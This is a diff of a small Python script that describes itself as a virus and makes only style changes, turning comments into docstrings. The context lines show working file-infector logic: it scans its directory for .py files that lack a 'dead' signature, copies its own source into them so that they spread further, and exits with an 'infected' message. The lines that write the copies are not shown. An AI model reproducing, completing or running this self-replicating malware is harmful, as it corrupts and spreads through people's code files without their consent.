@@ -1,9 +1,9 @@
 #!/usr/bin/python3
-'''
+"""
 This is a virus that will infect and kill
 all .py files in the directory its in.
 Infected files can infect new ones.
-'''
+"""
 import os
 import sys
 
@@ -12,13 +12,13 @@ SIGNATURE = "dead"
 toinfect = []
 
 def search():
-    # Search every file if it contains .py in filename and SIGNATURE in file
+    """ Search every file if it contains .py in filename and SIGNATURE in file """
     for f in os.listdir(PATH):
         if f[-3:] == ".py" and SIGNATURE not in open(f).read():
             toinfect.append(f)
 
 def infect(filestoinfect):
-    # Copy this entire script, resulting in infected files that can infect new ones
+    """ Copy this entire script, resulting in infected files that can infect new ones """
     virus = open(os.path.realpath(__file__))
     virusstring = ""
     for _, line in enumerate(virus):
@@ -33,7 +33,7 @@ def infect(filestoinfect):
         f.close()
 
 def bomb():
-    # Kills script
+    """ Kills script """
     sys.exit("This file is infected! Other .py files are now infected too!")
 
 
